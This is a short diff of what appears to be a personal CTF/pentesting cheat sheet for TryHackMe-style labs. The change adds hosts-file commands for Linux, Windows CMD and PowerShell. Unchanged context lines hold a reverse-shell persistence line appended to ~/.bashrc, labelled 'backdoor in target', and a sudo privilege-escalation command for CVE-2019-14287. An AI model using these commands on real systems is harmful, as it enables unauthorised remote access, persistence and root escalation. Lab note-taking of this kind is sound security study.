@@ -36,8 +36,10 @@ ssh user@10.10.10.10 -i id_rsa
 ---------------------------------------------------------------------
 echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' >> ~/.bashrc # backdoor in target
 ---------------------------------------------------------------------
-sudo echo "10.10.10.10 webenum.thm" >> /etc/hosts
-sudo echo "10.10.10.10 mysubdomain.webenum.thm" >> /etc/hosts
+# Add Host-ip to Local-DNS Resolver 
+sudo echo "10.10.10.10 webenum.thm" >> /etc/hosts # linux
+echo 192.168.1.100 myserver.local >> C:\Windows\System32\drivers\etc\hosts # Windows CMD
+Add-Content -Path "C:\Windows\System32\drivers\etc\hosts" -Value "`n10.10.218.14  lea.thm" # Windows Powershell
 ---------------------------------------------------------------------
 sudo -u#-1 /bin/bash # CVE-2019-14287 
 ---------------------------------------------------------------------
